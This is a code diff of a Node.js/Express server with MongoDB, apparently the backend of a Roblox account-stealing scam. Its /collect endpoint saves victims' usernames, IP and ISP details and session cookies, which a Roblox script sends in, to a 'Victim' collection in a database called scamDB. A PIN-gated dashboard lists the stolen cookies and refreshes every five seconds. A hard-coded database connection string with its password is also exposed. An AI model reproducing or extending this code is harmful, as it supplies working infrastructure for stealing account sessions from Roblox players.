@@ -2,19 +2,15 @@ const express = require('express');
 const mongoose = require('mongoose');
 const app = express();
 
-// ===== CONFIG =====
 const PORT = process.env.PORT || 3000;
 const MONGO_URI = 'mongodb+srv://lam279887_db_user:HkeGLjjzQgMOGpux@malsca.vvj7hgz.mongodb.net/scamDB?retryWrites=true&w=majority';
-const PASSCODE = '9799';           // 4‑digit PIN
-const DASHBOARD_TOKEN = 'secret9799';  // simple token to protect /dashboard
-// ==================
+const PASSCODE = '9799';
+const DASHBOARD_TOKEN = 'inner9799';   // simple token to protect /dashboard
 
-// Connect to MongoDB (persistent)
 mongoose.connect(MONGO_URI)
   .then(() => console.log('MongoDB connected'))
-  .catch(err => console.error(err));
+  .catch(err => console.error('MongoDB error:', err));
 
-// Schema for stolen data
 const victimSchema = new mongoose.Schema({
   username: String,
   userId: Number,
@@ -27,12 +23,12 @@ const Victim = mongoose.model('Victim', victimSchema);
 
 app.use(express.json());
 
-// ---- Endpoint that receives stolen data (used by Roblox script) ----
+// Endpoint for the Roblox script
 app.post('/collect', async (req, res) => {
   try {
     const entry = new Victim(req.body);
     await entry.save();
-    console.log('New entry saved:', entry.username);
+    console.log('New entry:', entry.username);
     res.sendStatus(200);
   } catch (err) {
     console.error(err);
@@ -40,17 +36,17 @@ app.post('/collect', async (req, res) => {
   }
 });
 
-// ---- API to get all victims (called by the dashboard) ----
+// API for the dashboard
 app.get('/api/victims', async (req, res) => {
   try {
-    const victims = await Victim.find({}).sort({ receivedAt: -1 });
+    const victims = await Victim.find({}).sort({ receivedAt: -1 }).lean();
     res.json(victims);
   } catch (err) {
     res.json([]);
   }
 });
 
-// ---- LOGIN PAGE (separate, only PIN input) ----
+// ---- Login page with 4-digit PIN ----
 app.get('/', (req, res) => {
   res.send(`
 <!DOCTYPE html>
@@ -61,7 +57,7 @@ app.get('/', (req, res) => {
   <style>
     * { margin:0; padding:0; box-sizing:border-box; }
     body { background:radial-gradient(circle at top, #1a1a2e, #0a0a0a); display:flex; justify-content:center; align-items:center; height:100vh; font-family:'Segoe UI',sans-serif; }
-    .pin-box { background:rgba(20,20,30,0.95); padding:3rem 2rem; border-radius:24px; box-shadow:0 0 50px rgba(0,255,200,0.25); text-align:center; }
+    .pin-box { background:rgba(20,20,30,0.95); padding:3rem 2rem; border-radius:24px; box-shadow:0 0 60px rgba(0,255,200,0.3); text-align:center; }
     h1 { color:#0ff; margin-bottom:5px; }
     p { color:#aaa; margin-bottom:25px; }
     .pin-inputs { display:flex; justify-content:center; gap:12px; }
@@ -86,35 +82,17 @@ app.get('/', (req, res) => {
     <div class="error" id="error">Wrong PIN!</div>
   </div>
   <script>
-    function autoTab(current, nextId) {
-      if (current.value.length === 1) {
-        document.getElementById(nextId)?.focus();
-      }
-    }
-    function getPin() {
-      const d1 = document.getElementById('d1').value;
-      const d2 = document.getElementById('d2').value;
-      const d3 = document.getElementById('d3').value;
-      const d4 = document.getElementById('d4').value;
-      return d1+d2+d3+d4;
-    }
-    function checkPin() {
-      if (getPin().length === 4) {
-        submitPin();
-      }
-    }
+    function autoTab(current, nextId) { if (current.value.length === 1) document.getElementById(nextId)?.focus(); }
+    function getPin() { return document.getElementById('d1').value + document.getElementById('d2').value + document.getElementById('d3').value + document.getElementById('d4').value; }
+    function checkPin() { if (getPin().length === 4) submitPin(); }
     function submitPin() {
-      const pin = getPin();
-      if (pin === '${PASSCODE}') {
-        window.location.href = '/dashboard?token=${DASHBOARD_TOKEN}';
-      } else {
+      if (getPin() === '${PASSCODE}') window.location.href = '/dashboard?token=${DASHBOARD_TOKEN}';
+      else {
         document.getElementById('error').style.display = 'block';
-        // Clear inputs
         ['d1','d2','d3','d4'].forEach(id => document.getElementById(id).value = '');
         document.getElementById('d1').focus();
       }
     }
-    // Focus first input
     window.onload = () => document.getElementById('d1').focus();
   </script>
 </body>
@@ -122,14 +100,9 @@ app.get('/', (req, res) => {
   `);
 });
 
-// ---- DASHBOARD PAGE (protected by token) ----
+// ---- Dashboard page ----
 app.get('/dashboard', (req, res) => {
-  // Check token
-  if (req.query.token !== DASHBOARD_TOKEN) {
-    return res.redirect('/');
-  }
-
-  // Serve full dashboard
+  if (req.query.token !== DASHBOARD_TOKEN) return res.redirect('/');
   res.send(`
 <!DOCTYPE html>
 <html>
@@ -189,7 +162,6 @@ app.get('/dashboard', (req, res) => {
           const isp = v.ipInfo?.isp || '?';
           const cookies = v.cookies || 'no cookie';
           const ts = v.timestamp ? new Date(v.timestamp * 1000).toLocaleString() : 'N/A';
-
           return \`
             <div class="card">
               <div class="card-header">
@@ -219,9 +191,7 @@ app.get('/dashboard', (req, res) => {
             </div>
           \`;
         }).join('');
-      } catch(e) {
-        console.error(e);
-      }
+      } catch(e) { console.error(e); }
     }
     loadData();
     setInterval(loadData, 5000);
